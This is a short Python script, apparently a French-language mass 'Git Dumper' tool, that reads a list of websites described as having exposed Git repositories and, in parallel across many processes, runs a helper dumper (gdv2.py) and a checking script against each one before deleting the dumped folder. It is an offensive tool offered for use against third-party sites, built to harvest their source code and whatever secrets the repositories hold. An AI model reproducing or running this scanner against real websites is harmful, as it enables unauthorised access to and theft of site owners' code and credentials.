import multiprocessing as mp
import os
import time
import shutil
import subprocess
from colorama import init, Fore, Style

init()

def work(url):
    folder = url.split("://")[1]
    run = ['python3', 'gdv2.py', url, folder]
    subprocess.Popen(run).communicate()
    check = ['sh', 'check.sh', folder]
    subprocess.Popen(check).communicate()
    shutil.rmtree(folder, ignore_errors=True)


if __name__ == '__main__':
    print(Fore.RED + r"""
    ____ ____ _ ____ _ _  _ ____ 
    |  | |__/ | | __ | |\ | [__  
    |__| |  \ | |__] | | \| ___] 
                        """)
    print(Fore.GREEN + "     <Dumper Git>  \n" + Style.RESET_ALL)
    print(Fore.GREEN + "      <By @xE4gleOfficiel> \n" + Style.RESET_ALL)
    isValid = False
    while not isValid:
        filename = input('\033[32mVeuillez saisir le nom ou le chemin du fichier texte contenant la liste des failles Git :  \033[0m').replace('"', '')

        if '.txt' not in filename:
            filename = f'{filename.split(".")[0]}.txt'
        if not os.path.isfile(filename):
            print(f'\t[!] - Filename Does Not Exist!', end='\r')
            time.sleep(1)
            print(' '*40, end='\r')
        else:
            isValid = True

    tmp = [str(x) for x in open(filename, encoding='utf-8', errors='ignore').read().splitlines() if bool(x)]
    targets = []
    for x in tmp:
        if 'http' not in x:
            x = f'http://{x}'
        x = '/'.join(x.split('/')[:3])
        targets.append(x)

    num_processes = mp.cpu_count() * 2  # Double du nombre de cœurs de processeur
    with mp.Pool(num_processes) as pool:
        pool.map(work, targets)